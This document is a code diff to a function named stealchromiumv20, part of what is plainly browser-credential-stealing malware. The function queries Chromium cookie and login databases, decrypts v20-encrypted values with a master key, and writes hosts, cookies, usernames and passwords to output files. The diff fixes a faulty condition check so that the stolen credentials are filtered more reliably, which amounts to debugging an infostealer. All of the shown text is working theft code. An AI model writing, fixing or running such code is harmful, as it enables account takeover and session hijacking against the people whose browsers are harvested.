@@ -562,7 +562,7 @@ def stealchromiumv20():
                         try:
                             for host, c0name, c0path, value, c0secure, expiry in cur.fetchall():
                                 decrypted = decrypt_v20_value(value, master_key)
-                                if not decrypted == 'DECRYPT_FAILED' or 'NOT_V20':
+                                if decrypted is not None:
                                     line = f"{host}\tTRUE\t{c0path}\t{str(c0secure).upper()}\t{expiry}\t{c0name}\t{decrypted}\n"
                                     write(cookieoutput, line)
                                     cookie_count += 1
@@ -584,7 +584,7 @@ def stealchromiumv20():
                         for host, c0name, value in cur.fetchall():
                             if c0name and value:
                                 decrypted = decrypt_v20_password(value, master_key)
-                                if not decrypted == 'DECRYPT_FAILED':
+                                if decrypted is not None:
                                     line = f"URL: {host}\nUSERNAME: {c0name}\nPASSWORD: {decrypted}\n---------------------------------\n"
                                     write(passwordoutput, line)
                                     password_count += 1
